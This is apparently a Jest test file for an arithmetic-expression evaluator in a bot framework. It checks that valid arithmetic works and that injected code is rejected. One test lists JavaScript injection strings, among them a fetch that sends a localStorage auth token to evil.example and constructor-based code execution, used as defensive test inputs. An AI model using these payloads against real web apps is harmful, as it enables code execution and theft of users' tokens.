import { evaluateExpression } from '../../external/bot-skeleton/scratch/utils/evaluate-expression';

describe('evaluateExpression (tick delay input)', () => {
    afterEach(() => {
        delete (globalThis as Record<string, unknown>).__pwned;
    });

    it('still evaluates plain arithmetic', () => {
        expect(evaluateExpression('2 + 3')).toBe(5);
        expect(evaluateExpression('(10 - 4) * 2')).toBe(12);
        expect(evaluateExpression(' 7 % 4 ')).toBe(3);
        expect(evaluateExpression('1.5 * 2')).toBe(3);
    });

    it('rejects empty and non-string input', () => {
        expect(evaluateExpression('')).toBe('invalid_input');
        expect(evaluateExpression(undefined as unknown as string)).toBe('invalid_input');
        expect(evaluateExpression(42 as unknown as string)).toBe('invalid_input');
    });

    it('never executes code smuggled into the expression', () => {
        const attacks = [
            '(globalThis.__pwned = 1)',
            '1; globalThis.__pwned = 1',
            "fetch('https://evil.example/' + localStorage.getItem('authToken'))",
            'constructor.constructor("globalThis.__pwned=1")()',
            '`${globalThis.__pwned = 1}`',
            '[].constructor.constructor("return 1")()',
            'alert(1)',
            '1 + eval("1")',
            "'a' + 'b'",
            'x',
        ];
        for (const attack of attacks) {
            expect(evaluateExpression(attack)).toBe('invalid_input');
        }
        expect((globalThis as Record<string, unknown>).__pwned).toBeUndefined();
    });

    it('rejects absurdly long input', () => {
        expect(evaluateExpression('1+'.repeat(300) + '1')).toBe('invalid_input');
    });

    it('returns invalid_input for malformed arithmetic', () => {
        expect(evaluateExpression('2 +')).toBe('invalid_input');
        expect(evaluateExpression('(((')).toBe('invalid_input');
    });
});
